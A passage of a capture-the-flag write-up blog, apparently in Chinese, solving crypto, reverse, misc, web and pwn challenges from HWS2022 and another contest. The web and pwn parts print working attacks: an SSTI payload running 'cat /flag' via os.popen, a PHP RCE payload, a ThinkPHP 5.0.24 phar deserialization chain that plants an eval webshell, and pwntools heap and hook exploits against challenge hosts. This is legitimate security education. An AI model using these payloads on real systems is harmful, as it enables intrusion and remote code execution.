1492164290534197296766878830710549288168716657792979479408332026408553210558539364503279432780006256047888761718878241924947937039103166564146378209168719163067531460700424309878383312837345239570897122826051628153030129647363574035072755426112229160684859510640271933580581310029921376842631120847546030843821787623965614564745724229763999106839802052036834811357341644073138100679508864747009014415530176077648226083725813290110828240582884113726976794751006967153951269748482024859714451264220728184903144004573228365893961477199925864862018084224563883101101842275596219857205470076943493098825250412323522013524 d = exgcd(e, (p - 1) * (q - 1))[0] print(n2s(pow(flag, d, N))) flag:\n\r\ncrypto_Elgamal 首先是一个 LCG 的链式求解，通过五个值解出 A,B,q\n分析 elgmal 签名，同样使用了 LCG，那么有两个加密值就能够恢复消息，推导如下\n$$ c_{2'}\\equiv mh^{Ar_1+B} \\equiv m(h^{r_1})^Ah^B \\equiv mh^{r_1}(h^{r_1})^{A-1}h^B \\equiv c_2(h^{r_1})^{A-1}h^B\\pmod p $$\n$$ \\therefore (h^{r_1})^{A-1} \\equiv c_{2'}c_2^{-1}h^{-B} \\pmod p $$\n可以设法求出 $h^{r_1}$ 的值，然后就可以通过 $c_2=mh^{r_1}$ 求解出 m 值\n但由于 $A-1$ 和 $p-1$ 不互素，无法直接求得逆元，因此需要高次同余开根算法，这里使用了 AMM 算法进行求解，按照论文直接复现出来，得到 $h^{r_1}$ 的值\n最后计算 $m\\equiv c_2(h^{r_1})^{-1}\\pmod p$ 得到flag\nLCG 求解 ABq：\nfrom Crypto.Util.number import * def gcd(a,b): if(b==0): return a else: return gcd(b,a%b) s = [543263588863771657634119, 628899245716105951093835, 78708024695487418261582, 598971435111109998816796, 789474285039501272453373] t = [] for i in range(5): t.append(s[i]-s[i-1]) all_n = [] for i in range(3): all_n.append(gcd((t[i+1]*t[i-1]-t[i]*t[i]), (t[i+2]*t[i]-t[i+1]*t[i+1]))) MMI = lambda A, n,s=1,t=0,N=0: (n \u0026lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n\u0026lt;1] #逆元计算 for n in all_n: n=abs(n) if n==1: continue a=(s[2]-s[1])*MMI((s[1]-s[0]),n)%n ani=MMI(a,n) b=(s[1]-a*s[0])%n print(a, b, n) AMM 算法代码：\nimport random import math import libnum import time from Crypto.Util.number import bytes_to_long,long_to_bytes p = 0 def GF(a): global p p = a def g(a,b): global p return pow(a,b,p) def AMM(x,e,p): GF(p) y = random.randint(1, p-1) while g(y, (p-1)//e) == 1: y = random.randint(1, p-1) print(y) #p-1 = e^t*s t = 1 s = 0 while p % e == 0: t += 1 print(t) s = p // (e**t) # s|ralpha-1 k = 1 while((s * k + 1) % e != 0): k += 1 alpha = (s * k + 1) // e a = g(y, (e ** (t - 1) ) * s) b = g(x, e * alpha - 1) c = g(y, s) h = 1 # for i in range(1, t-1): print(\u0026#39;cur_i\u0026#39;,i) d = g(b,e**(t-1-i)) if d == 1: j = 0 else: j = (-math.log(d,a) % e) b = b * (g(g(c, e), j)) h = h * g(c, j) c = g(c,e) return (g(x,alpha * h)) % p 解题脚本：\n#coding=utf-8 from gmpy2 import * from libnum import * from amm import AMM A = 12742153496769814072597 B = 3035433788765894539799 q = 791763770658839585424113 # A = 107868759310796409744994 # B = 492302818740419286543885 p = 65211247300401312530078141569304950676358489059623557848188896752173856845051471066071652073612337629832155846984721797768267868868902023383604553319793550396610085424563231688918357710337401138108050205457200940158475922063279384491022916790549837379548978141370347556053597178221402425212594060342213485311 g = 27642593390439430783453736408814717946185190497201679721975757020767271070510268596627490205095779429964809833535285315202625851326460572368018875381603399143376574281200028337681552876140857556460885848491160812604549770668188783258592940823128376128198726254875984002214053523752696104568469730021811399216 h = 54585833166051670245656045196940486576634589000609010947618047461787934106392112227019662788387352615714332234871251868259282522817042504587428441746855906297390193418159792477477443129333707197013251839952389651332058368911829464978546505729530760951698134101053626585254469108630886768357270544236516534904 c1 = 60724920570148295800083597588524297283595971970237964464679084640302395172192639331196385150232229004030419122038089044697951208850497923486467859070476427472465291810423905736825272208842988090394035980454248119048131354993356125895595138979611664707727518852984351599604226889848831071126576874892808080133 c2 = 48616294792900599931167965577794374684760165574922600262773518630884983374432147726140430372696876107933565006549344582099592376234783044818320678499613925823621554608542446585829308488452057340023780821973913517239972817669309837103043456714481646128392677624092659929248296869048674230341175765084122344264 c1_ = 42875731538109170678735196002365281622531058597803022779529275736483962610547258618168523955709341579773947887175626960699426438456382655370090748369934296474999389316334717699127421889816721511602392591677377678759026657582648354688447456509292302633971842316239774410380221303269351351929586256938787054867 c2_ = 64829024929257668640929285124747107162970460545535885047576569803424908055130477684809317765011143527867645692710091307694839524199204611328374569742391489915929451079830143261799375621377093290249652912850024319433129432676683899459510155157108727860920017105870104383111111395351496171846620163716404148070 k = (p - 1) // q assert k * q + 1 == p # print(q, k) hr1_A_1 = c2_ * invert(c2, p) * pow(h,-B, p) % p # print(hr1_A_1) d = xgcd(A - 1, p - 1)[0] % (p - 1) cur_x = AMM(hr1_A_1, 7438, p) # assert pow(cur_x, A - 1, p) == hr1_A_1 d = xgcd(A - 1, p - 1)[0] % (p - 1) x_7438 = pow(hr1_A_1, d, p) x_3719 = AMM(x_7438, 2, p) x_3719_ = p - x_3719 x_3719s = [x_3719, x_3719_] mol = (p - 1) // 3719 def check(mm): for i in mm: if i \u0026gt;= 128: return False return True for eve_c in x_3719s: cur_x = AMM(eve_c, 3719, p) assert pow(cur_x, A - 1, p) == hr1_A_1 for i in range(1, 1 + 6000): cur_use = cur_x * pow(i, mol, p) assert pow(cur_use, A - 1, p) == hr1_A_1 cur_m = xgcd(cur_use, p)[0] * c2 % p cur_m = n2s(int(cur_m)) if check(cur_m): print(cur_m) break # b\u0026#39;flag{19e9f185e6a680324cedd6e6d9382743}\u0026#39; Misc badPDF 文件在运行之后在 %tmp% 目录下释放了三个文件，将 js 和 tmp 都提取出来\n\r\ntmp的内容好像是在混淆，查了一下应该是使用 winrm.vbs 绕过应用白名单执行任意未签名代码(https://www.anquanke.com/post/id/151711)，再一找发现是原题\n找个 vbs 脚本改一下\nfor i= 1 to len(\u0026quot;676d60667a64333665326564333665326564333665326536653265643336656564333665327c\u0026quot;) step 2:\rflag = flag \u0026amp; chr(asc(chr(\u0026quot;\u0026amp;h\u0026quot; \u0026amp; mid(\u0026quot;676d60667a64333665326564333665326564333665326536653265643336656564333665327c\u0026quot;,i,2)))xor 1):\rnext:\rmsgbox(flag)\r运行结果：\n\r\ngogogo 先解puzzle，gaps不知道为啥跑不动，手动硬拼，口令是3e8f092d4d7b80ce338d6e238efb01\n随后是个内存取证，在内存剪切板上又看到了上面的口令，确定了该口令只有30位而不是个md5\n\r\n在内存的文件找到了csgo.zip，用口令解密拿到图片，但显示不出来，用010editor打开图片，发现png文件头重复，删掉一个，看到正经图片，但是缺少定位符\n\r\n图片是个Aztec码，找了个二层的定位符，硬拼一下，在线网站直接解(https://products.aspose.app/barcode/recognize/aztec#/recognized)\n\r\nflag:\n\r\n","date":"2022-01-26T13:03:21+08:00","image":"https://or4ngesec.github.io/post/hws2022-writeup/cover_hu31039705144761defd1e1848d4287a81_131160_120x120_fill_q75_box_smart1.jpg","permalink":"https://or4ngesec.github.io/post/hws2022-writeup/","title":"HWS2022冬令营预选赛 Writeup"},{"content":"Web RCE_No_Para 无参数RCE，且过滤了部分函数。\n最终payload：\n?a=cat flag.php;\u0026amp;code=system(current(current(get_defined_vars())));\rflask 查看网页源码\n\u0026lt;!--if not request.full_path.endswith(\u0026quot;.js?\u0026quot;):\rif not request.full_path.startswith(\u0026quot;/login\u0026quot;):\rreturn redirect(\u0026quot;login\u0026quot;)--\u0026gt;\r要求路径是以/login开头，以.js?结尾，\n查看 flask 文档\nRequested path, including the query string.\n所以构造路径：\n/login/../admin?a=.js?\r然后源码提示：\n\u0026lt;!--admin/?name=--\u0026gt;\r使用以下路径发现是ssti\n/login/../admin?name={{7*7}}\u0026amp;a=.js?\rfuzz发现过滤了__，builtins，所以绕，最终payload\n/login/../admin?name={{config|attr('_'+'_init_'+'_')|attr('_'+'_globals_'+'_')|attr('_'+'_getitem_'+'_')('_'+'_buil'+'tins_'+'_')|attr('_'+'_getitem_'+'_')('eval')('_'+'_import_'+'_(\u0026quot;os\u0026quot;).popen(\u0026quot;cat /flag\u0026quot;).read()')}}\u0026amp;a=.js?\rtp 变量覆盖+phar反序列化+thinkphp 5.0.24反序列化写webshell\n生成phar文件\n\u0026lt;?php namespace think\\process\\pipes; class Windows { private $files = []; public function __construct() { $this-\u0026gt;files = [new \\think\\model\\Merge]; } } namespace think\\model; use think\\Model; class Merge extends Model { protected $append = []; protected $error; public function __construct() { $this-\u0026gt;append = [ \u0026#39;bb\u0026#39; =\u0026gt; \u0026#39;getError\u0026#39; ]; $this-\u0026gt;error = (new \\think\\model\\relation\\BelongsTo); } } namespace think; class Model{} namespace think\\console; class Output { protected $styles = []; private $handle = null; public function __construct() { $this-\u0026gt;styles = [\u0026#39;removeWhereField\u0026#39;]; $this-\u0026gt;handle = (new \\think\\session\\driver\\Memcache); } } namespace think\\model\\relation; class BelongsTo { protected $query; public function __construct() { $this-\u0026gt;query = (new \\think\\console\\Output); } } namespace think\\session\\driver; class Memcache { protected $handler = null; public function __construct() { $this-\u0026gt;handler = (new \\think\\cache\\driver\\Memcached); } } namespace think\\cache\\driver; class File { protected $tag; protected $options = []; public function __construct() { $this-\u0026gt;tag = false; $this-\u0026gt;options = [ \u0026#39;expire\u0026#39; =\u0026gt; 3600, \u0026#39;cache_subdir\u0026#39; =\u0026gt; false, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, \u0026#39;data_compress\u0026#39; =\u0026gt; false, \u0026#39;path\u0026#39; =\u0026gt; \u0026#39;php://filter/convert.base64-decode/resource=/var/www/html/public/\u0026#39;, ]; } } class Memcached { protected $tag; protected $options = []; protected $handler = null; public function __construct() { $this-\u0026gt;tag = true; $this-\u0026gt;options = [ \u0026#39;expire\u0026#39; =\u0026gt; 0, \u0026#39;prefix\u0026#39; =\u0026gt; \u0026#39;PD9waHAKZXZhbCgkX0dFVFsnYSddKTsKPz4\u0026#39;, ]; $this-\u0026gt;handler = (new File); } } $obj = new \\think\\process\\pipes\\Windows(); @unlink(\u0026#34;or4nge.phar\u0026#34;); $phar = new \\Phar(\u0026#34;or4nge.phar\u0026#34;); //后缀名必须为phar $phar-\u0026gt;startBuffering(); $phar-\u0026gt;setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;); //设置stub $phar-\u0026gt;setMetadata($obj); //将自定义的meta-data存入manifest $phar-\u0026gt;addFromString(\u0026#34;test.txt\u0026#34;, \u0026#34;test\u0026#34;); //添加要压缩的文件 //签名自动计算 $phar-\u0026gt;stopBuffering(); 变量覆盖，触发反序列化\nimport requests url = \u0026#39;http://9316a714.lxctf.net/public/index.php/index/Index/upload\u0026#39; files = {\u0026#39;file\u0026#39;: (\u0026#39;or4nge\u0026#39;, open(\u0026#39;or4nge.phar\u0026#39;, \u0026#39;rb\u0026#39;))} r = requests.post(url, files=files) r = requests.post(url, params=\u0026#34;FILES[file][tmp_name]=or4nge.jpg\u0026amp;FILES[file][name]=phar://or4nge\u0026#34;) print(r.text) 会在 /var/www/html/public 下生成 8fba8bb6410a4aee90b063a8b7e78b73.php，文件内容包含 \u0026lt;?php eval($_GET['a']); 直接用就可以了。\nPwn pwn1 from pwn import * import sys context.log_level = \u0026#34;debug\u0026#34; if len(sys.argv) \u0026lt; 2: debug = True else: debug = False if debug: p = process(\u0026#34;./pwn1\u0026#34;) else: p = remote(\u0026#34;113.201.14.253\u0026#34;,16088) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *{b}\u0026#34;.format(b = hex(b))) else: gdb.attach(p) debugf(0x08048596) ru(\u0026#39;Gift:\u0026#39;) buf = int(ru(b\u0026#39;\\n\u0026#39;)[:-1],16) pay = p32(0x8048540)+b\u0026#39;a\u0026#39;*48 + p32(buf+4) sn(pay) #flag{474b7f9219effe69530da4ad63c1752a} p.interactive() pwn2 off by one\nfrom pwn import * import sys context(os=\u0026#39;linux\u0026#39;, arch=\u0026#39;amd64\u0026#39;, log_level=\u0026#39;debug\u0026#39;) if len(sys.argv) \u0026lt; 2: debug = True else: debug = False if debug: p = process(\u0026#34;./pwn2\u0026#34;) libc = ELF(\u0026#34;/lib/x86_64-linux-gnu/libc-2.27.so\u0026#34;) else: p = remote(\u0026#34;113.201.14.253\u0026#34;, 16066) libc = ELF(\u0026#34;./libc-2.27.so\u0026#34;) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *$rebase({b})\u0026#34;.format(b = hex(b))) else: gdb.attach(p) elf = ELF(\u0026#39;./pwn2\u0026#39;) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def menu(i): ru(\u0026#34;Choice: \u0026#34;) sl(str(i)) def add(size, content): menu(1) sla(\u0026#34;size: \u0026#34;, str(size)) sa(\u0026#34;content: \u0026#34;, content) def edit(idx,content): menu(2) sla(\u0026#34;idx: \u0026#34;, str(idx)) sla(\u0026#34;content: \u0026#34;, content) def free(idx): menu(3) sla(\u0026#34;idx: \u0026#34;, str(idx)) def show(idx): menu(4) sla(\u0026#34;idx: \u0026#34;, str(idx)) add(0x18, b\u0026#34;a\u0026#34; + b\u0026#34;\\n\u0026#34;) add(0x18, b\u0026#34;b\u0026#34;*0x18 + b\u0026#34;\\n\u0026#34;) for i in range(8): add(0x80, b\u0026#34;aaa\u0026#34; + b\u0026#34;\\n\u0026#34;) for i in range(8): free(9-i) free(0) add(0x18, b\u0026#34;a\u0026#34;*0x18 + b\u0026#34;\\xb1\u0026#34; + b\u0026#34;\\n\u0026#34;) free(1) add(0xa0, b\u0026#34;c\u0026#34; + b\u0026#34;\\n\u0026#34;) edit(1, b\u0026#34;c\u0026#34;*0x1f) show(1) libc.address = u64(p.recvuntil(\u0026#34;\\x7f\u0026#34;)[-6:].ljust(8, b\u0026#34;\\x00\u0026#34;)) - 96 - 0x10 - libc.sym[\u0026#34;__malloc_hook\u0026#34;] print(hex(libc.address)) edit(1, b\u0026#34;c\u0026#34;*0x18 + p64(0x91) + p64(libc.sym[\u0026#34;__free_hook\u0026#34;]) + p64(96 + 0x10 + libc.sym[\u0026#34;__malloc_hook\u0026#34;])) add(0x80, b\u0026#34;/bin/sh\\x00\u0026#34; + b\u0026#34;\\n\u0026#34;) for i in range(7): add(0x80, b\u0026#34;aaa\u0026#34; + b\u0026#34;\\n\u0026#34;) free(9) edit(1, b\u0026#34;c\u0026#34;*0x18 + p64(0x91) + p64(libc.sym[\u0026#34;__free_hook\u0026#34;])*2) add(0x80, b\u0026#34;ddd\u0026#34; + b\u0026#34;\\n\u0026#34;) add(0x80, p64(libc.sym[\u0026#34;system\u0026#34;]) + b\u0026#34;\\n\u0026#34;) free(2) p.interactive() pwn3 随便玩玩拿到puts地址，写exit_hook拿shell\nfrom pwn import * import sys context.log_level = \u0026#34;debug\u0026#34; if len(sys.argv) \u0026lt; 2: debug = True else: debug = False if debug: p = process(\u0026#34;./Gpwn3\u0026#34;) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) else: p = remote(\u0026#34;113.201.14.253\u0026#34;, 16033) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) ru = lambda x : p.recvuntil(x) sn = lambda x : p.send(x) rl = lambda : p.recvline() sl = lambda x : p.sendline(x) rv = lambda x : p.recv(x) sa = lambda a,b : p.sendafter(a,b) sla = lambda a,b : p.sendlineafter(a, b) def debugf(b=0): if debug: if b: gdb.attach(p,\u0026#34;b *{b}\u0026#34;.format(b = hex(b))) else: gdb.attach(p) def menu(i): sla(\u0026#39;choice:\u0026#39;, str(i)) def create(c): menu(1) sa(\u0026#39;:\u0026#39;, c) def up(c): menu(2) sa(\u0026#39;:\u0026#39;, c) create(b\u0026#39;\\xff\u0026#39;*35) # up(b\u0026#39;\\x01\u0026#39;*34+b\u0026#39;\\x00\u0026#39;) up(b\u0026#39;\\x01\u0026#39;) up(p64(2147483647)) menu(3) ru(\u0026#39;reward:\u0026#39;) libc.address = int(ru(b\u0026#39;\\n\u0026#39;)[:-1],16) - 0x06f6a0 log.warning(hex(libc.address)) ru(\u0026#39;name\u0026#39;) sn(p64(libc.address+0x5f0040+3848)) ru(\u0026#39;you!\u0026#39;) sn(p64(libc.address+0xf1247)) p.interactive() \u0026#39;\u0026#39;\u0026#39; 0x45226 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: rax == NULL 0x4527a execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x30, environ) constraints: [rsp+0x30] == NULL 0xf03a4 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x50, environ) constraints: [rsp+0x50] == NULL 0xf1247 execve(\u0026#34;/bin/sh\u0026#34;, rsp+0x70, environ) constraints: [rsp+0x70] == NULL \u0026#39;\u0026#39;\u0026#39; Reverse lemon 感谢 yaoxi 师傅送的一血（狗头）\nlemon 语言，仿照 HITCON cclemon，手动恢复字节码\nvar a = [65, 69, 83];\rvar b = [113, 105, 117, 113, 105, 117, 108, 101, 98, 105, 101, 122, 117, 111, 108, 101];\rvar c = 0;\rvar d = [];\rwhile (c \u0026lt; 256){\rd.append(c);\rc = c + 1;\r};\rvar e = 0;\rwhile (e \u0026lt; 256) {\rd[e] = (d[e] + a[e % 3] + b[e % 16]) % 256;\re += 1;\r};\rvar f = 0;\rwhile (f \u0026lt; 3) {\rvar g = 0;\rwhile (g \u0026lt; 256) {\rd[g] = d[g] ^ d[(g + 1) % 256];\rg = g + 1;\r};\rvar h = 0;\rwhile (h \u0026lt; 256) {\rd[h] = (d[h] + 1) % 256;\rh = h + 1;\r};\rf = f + 1;\r};\rf = 0;\rvar i = 0;\rwhile (f \u0026lt; 256) {\ri = i + d[f];\rf = f + 1;\r};\ri = i * 20 + 5;\ri = i * 30 - 5;\ri = i * 40 - 5;\ri = i * 50 + 6645;\rprint(i);\r运行结果就是flag\neasy_py uncompyle6反编译\nsleep+多线程，两个运算轮流进行\nIn [1]: cipher = [44, 100, 3, 50, 106, 90, 5, 102, 10, 112] In [2]: for i in range(0, 9, 2): ...: cipher[i] ^= cipher[i + 1] ...: cipher[i + 1] ^= i + 1 ...: In [3]: cipher Out[3]: [72, 101, 49, 49, 48, 95, 99, 97, 122, 121] In [4]: for c in cipher: ...: print (chr(c), end=\u0026#39;\u0026#39;) ...: He110_cazy combat_slogan jd-gui可出源码\npackage com.xaut; import java.io.PrintStream; import java.util.Scanner; public class Main { public static String stringTransformAscii(String value) { StringBuffer sbu = new StringBuffer(); char[] chars = value.toCharArray(); for (int i = 0; i \u0026lt; chars.length; i++) { if (i != chars.length - 1) { sbu.append(chars[i]).append(\u0026#34;,\u0026#34;); } else { sbu.append(chars[i]); } } return sbu.toString(); } public static String ttk(String input) { StringBuilder sb = new StringBuilder(); for (int i = 0; i \u0026lt; input.length(); i++) { char c = input.charAt(i); if ((c \u0026gt;= \u0026#39;a\u0026#39;) \u0026amp;\u0026amp; (c \u0026lt;= \u0026#39;m\u0026#39;)) { c = (char)(c + \u0026#39;\\r\u0026#39;); } else if ((c \u0026gt;= \u0026#39;A\u0026#39;) \u0026amp;\u0026amp; (c \u0026lt;= \u0026#39;M\u0026#39;)) { c = (char)(c + \u0026#39;\\r\u0026#39;); } else if ((c \u0026gt;= \u0026#39;n\u0026#39;) \u0026amp;\u0026amp; (c \u0026lt;= \u0026#39;z\u0026#39;)) { c = (char)(c - \u0026#39;\\r\u0026#39;); } else if ((c \u0026gt;= \u0026#39;N\u0026#39;) \u0026amp;\u0026amp; (c \u0026lt;= \u0026#39;Z\u0026#39;)) { c = (char)(c - \u0026#39;\\r\u0026#39;); } sb.append(c); } return sb.toString(); } public static void main(String[] args) { System.out.println(\u0026#34;Please input your keyword::\u0026#34;); Scanner scan = new Scanner(System.in); String str2 = \u0026#34;ddd\u0026#34;; if (scan.hasNextLine()) { str2 = scan.nextLine(); } scan.close(); String stringTransformAscii = stringTransformAscii(str2); String[] offerCodeString = stringTransformAscii.split(\u0026#34;,\u0026#34;); StringBuffer str5 = new StringBuffer(); for (String s : offerCodeString) { str5.append(s); } int flag = ttk(str2).compareTo(\u0026#34;Jr_j11y_s1tug_g0_raq_g0_raq_pnml\u0026#34;); if ((flag == 0) \u0026amp;\u0026amp; (str5.toString().compareTo(\u0026#34;871019511949491089510249103104116951164895101110100951164895101110100959997122121\u0026#34;) == 0)) { System.out.println(\u0026#34;Your keyword is correct!\u0026#34;); } else { System.out.println(\u0026#34;Your keyword is wrong!\u0026#34;); } } } ttk 凯撒 k=13\nWe_w11l_f1ght_t0_end_t0_end_cazy\nflag:\nflag{We_w11l_f1ght_t0_end_t0_end_cazy}\rcute_doge 运行后dump内存\n\r\n解base64\nZmxhZ3tDaDFuYV95eWRzX2Nhenl9\nflag:\nflag{Ch1na_yyds_cazy}\rCrypto LinearEquations 线性同余方程\nd[0] * b + d[1] * a + c = d[2]\rd[1] * b + d[2] * a + c = d[3]\rd[2] * b + d[3] * a + c = d[4]\r所以有\n(d[1] - d[0]) * b + (d[2] - d[1]) * a = d[3] - d[2]\r(d[2] - d[1]) * b + (d[3] - d[2]) * a = d[4] - d[3]\r求解同余方程即可\n直接放ipython的log了\nd = [2626199569775466793, 8922951687182166500, 454458498974504742, 7289424376539417914, 8673638837300855396] n = 10104483468358610819 In [24]: from libnum import * In [25]: left = (d[4] - d[3]) * (d[1] - d[0]) % n - (d[3] - d[2]) * (d[2] - d[1]) % n In [26]: left Out[26]: 2071989288624214374 In [28]: right = (d[3] - d[2]) * (d[1] - d[0]) % n - (d[2] - d[1]) ** 2 % n In [29]: right Out[29]: -220570350959470413 In [30]: right %= n In [31]: right Out[31]: 9883913117399140406 In [32]: invmod(right, n) Out[32]: 9158039860152232368 In [33]: invmod(right, n) * left % n Out[33]: 5490290802446982981 In [34]: a = invmod(right, n) * left % n In [35]: n2s(a) Out[35]: b\u0026#39;L1near_E\u0026#39; In [36]: left = (d[3] - d[2]) % n In [37]: left = (d[3] - d[2]) % n - (d[2] - d[1]) * a % n In [38]: left Out[38]: 2594113358272023300 In [39]: left %= n In [40]: left Out[40]: 2594113358272023300 In [41]: right = d[1] - d[0] In [42]: left * invmod(right, n) Out[42]: 22730265397535795623381317872033942100 In [43]: b = left * invmod(right, n) % n In [44]: b Out[44]: 8175498372211240502 In [45]: n2s(b) Out[45]: b\u0026#39;qu4t1on6\u0026#39; In [46]: n2s(a) Out[46]: b\u0026#39;L1near_E\u0026#39; In [47]: n2s(b) Out[47]: b\u0026#39;qu4t1on6\u0026#39; In [48]: c = d[2] - d[0] * b - d[1] * a In [49]: c %= n In [50]: n2s(c) Out[50]: b\u0026#39;_1s_34sy\u0026#39; no_can_no_bb key 最大是 1 \u0026lt;\u0026lt; 20，可以直接爆破\n如果解密后开头为 cazy 说明正确\nfrom Crypto.Util.number import long_to_bytes from Crypto.Cipher import AES def pad(m): tmp = 16-(len(m)%16) return m + bytes([tmp for _ in range(tmp)]) def encrypt(m,key): aes = AES.new(key,AES.MODE_ECB) return aes.encrypt(m) c = b\u0026#39;\\x9d\\x18K\\x84n\\xb8b|\\x18\\xad4\\xc6\\xfc\\xec\\xfe\\x14\\x0b_T\\xe3\\x1b\\x03Q\\x96e\\x9e\\xb8MQ\\xd5\\xc3\\x1c\u0026#39; for i in range(1, (1 \u0026lt;\u0026lt; 20) + 1): key = pad(long_to_bytes(i)) aes = AES.new(key, AES.MODE_ECB) flag = aes.decrypt(c) if flag[:5] == b\u0026#39;cazy{\u0026#39;: print (flag) # b\u0026#39;cazy{n0_c4n,bb?n0p3!}\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\u0026#39; no_cry_no_can 福纳姆密码，密钥长度为 5，并且已知 flag 开头为 cazy{，所以直接解\nfrom libnum import * front = b\u0026#39;cazy{\u0026#39; cipher = b\u0026#39;\u0026lt;pH\\x86\\x1a\u0026amp;\u0026#34;m\\xce\\x12\\x00pm\\x97U1uA\\xcf\\x0c:NP\\xcf\\x18~l\u0026#39; key = bytes([f ^ c for f, c in zip(front, cipher)]) key *= 8 for c, k in zip(cipher, key): print (chr(c ^ k), end=\u0026#39;\u0026#39;) print() #cazy{y3_1s_a_h4nds0me_b0y!} math from math import gcd from gmpy2 import invert, is_prime from Crypto.Util.number import long_to_bytes as n2s invq = 0x63367a2b947c21d5051144d2d40572e366e19e3539a3074a433a92161465543157854669134c03642a12d304d2d9036e6458fe4c850c772c19c4eb3f567902b3 e = 0x10005 d = 0xae285803302de933cfc181bd4b9ab2ae09d1991509cb165aa1650bef78a8b23548bb17175f10cddffcde1a1cf36417cc080a622a1f8c64deb6d16667851942375670c50c5a32796545784f0bbcfdf2c0629a3d4f8e1a8a683f2aa63971f8e126c2ef75e08f56d16e1ec492cf9d26e730eae4d1a3fecbbb5db81e74d5195f49f1 c = 0x5a1e001edd22964dd501eac6071091027db7665e5355426e1fa0c6360accbc013c7a36da88797de1960a6e9f1cf9ad9b8fd837b76fea7e11eac30a898c7a8b6d8c8989db07c2d80b14487a167c0064442e1fb9fd657a519cac5651457d64223baa30d8b7689d22f5f3795659ba50fb808b1863b344d8a8753b60bb4188b5e386 kphi = e * d - 1 for k in range(1, e): if kphi % k == 0: phi = kphi // k x = invq * (phi - 1) + 1 g = pow(2, phi, x) - 1 for r in [3, 5]: g = gcd(g, pow(r, phi, x) - 1) if 1 \u0026lt; g \u0026lt; 10 * c: p = g break assert is_prime(p) m = pow(c, d, p) print(n2s(m)) #flag{c4617a206ba83d7f824dc44e5e67196a} no_math_no_cry 解方程就行\nsage:\n((x-(1\u0026lt;\u0026lt;500))**2+0x0338470-10715086071862673209484250490600018105614048117055336074437503883703510511248211671489145400471130049712947188505612184220711949974689275316345656079538583389095869818942817127245278601695124271626668045250476877726638182396614587807925457735428719972874944279172128411500209111406507112585996098530169).roots() 得到:\n[(6546781215792283740026379393655198304433284092086129578966582736192267592809173519135824526914006312711658519949412876200359056032790029580847075395203, 1), (175590630715657737802001590114848305707265818075457058980756525809979783549, 1)] 再long_to_bytes就行\n\r\nflag:\ncazy{1234567890_no_m4th_n0_cRy}\rMisc 八卦迷宫 直接走迷宫就行\n\r\nflag:\ncazy{zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang}\r朴实无华的取证 vol 内存取证 dump 出 我的日记.txt.txt，flag.zip 以及 flag.png 那个文件\n\r\n在 我的日记.txt.txt 找到压缩包密码 20211209\n\r\n\r\n得到 flag.zip 压缩包里的 encrypt.txt 内容\n//幼儿园水平的加密（部分） void Encrypt(string\u0026amp; str) { for(int i = 0; i \u0026lt; str.length(); i++) { if(str[i] \u0026gt;=\u0026#39;a\u0026#39;\u0026amp;\u0026amp; str[i]\u0026lt;=\u0026#39;w\u0026#39;) str[i]+=3; else if(str[i]==\u0026#39;x\u0026#39;) str[i]=\u0026#39;a\u0026#39;; else if(str[i]==\u0026#39;y\u0026#39;) str[i]=\u0026#39;b\u0026#39;; else if(str[i]==\u0026#39;z\u0026#39;) str[i]=\u0026#39;c\u0026#39;;\telse if(str[i]==\u0026#39;_\u0026#39;) str[i]=\u0026#39;|\u0026#39;; str[i] -= 32; } } 再通过 flag.png 的内容依照上面的 encrypt() 进行解密\n\r\nFDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]\r\u0026gt;\u0026gt;\u0026gt; ss = \u0026#39;FDCB[8LDQ?ZLOO?FHUWDLQOB?VXFFHHG?LQ?ILJKWLQJ?WKH?HSLGHPLF]\u0026#39; \u0026gt;\u0026gt;\u0026gt; flag = \u0026#39;\u0026#39; \u0026gt;\u0026gt;\u0026gt; for i in range(len(ss)): ... flag += chr(ord(ss[i])+32) ... \u0026gt;\u0026gt;\u0026gt; flag \u0026#39;fdcb{Xldq_zloo_fhuwdlqob_vxffhhg_lq_iljkwlqj_wkh_hslghplf}\u0026#39; \u0026gt;\u0026gt;\u0026gt; flag.replace(\u0026#39;a\u0026#39;,\u0026#39;x\u0026#39;).replace(\u0026#39;b\u0026#39;,\u0026#39;y\u0026#39;).replace(\u0026#39;c\u0026#39;,\u0026#39;z\u0026#39;) \u0026#39;fdzy{Xldq_zloo_fhuwdlqoy_vxffhhg_lq_iljkwlqj_wkh_hslghplf}\u0026#39; sss = \u0026#39;fdzy{Xldq_zloo_fhuwdlqoy_vxffhhg_lq_iljkwlqj_wkh_hslghplf}\u0026#39; for i in range(len(sss)): if(ord(sss[i]) \u0026gt;= 100 and ord(sss[i]) \u0026lt;= 122): print(\u0026#34;i:\u0026#34;,i,\u0026#34;data:\u0026#34;,chr(ord(sss[i])-3)) print(sss) i: 0 data: c i: 1 data: a i: 2 data: w i: 3 data: v i: 6 data: i i: 7 data: a i: 8 data: n i: 10 data: w i: 11 data: i i: 12 data: l i: 13 data: l i: 15 data: c i: 16 data: e i: 17 data: r i: 18 data: t i: 19 data: a i: 20 data: i i: 21 data: n i: 22 data: l i: 23 data: v i: 25 data: s i: 26 data: u i: 27 data: c i: 28 data: c i: 29 data: e i: 30 data: e i: 31 data: d i: 33 data: i i: 34 data: n i: 36 data: f i: 37 data: i i: 38 data: g i: 39 data: h 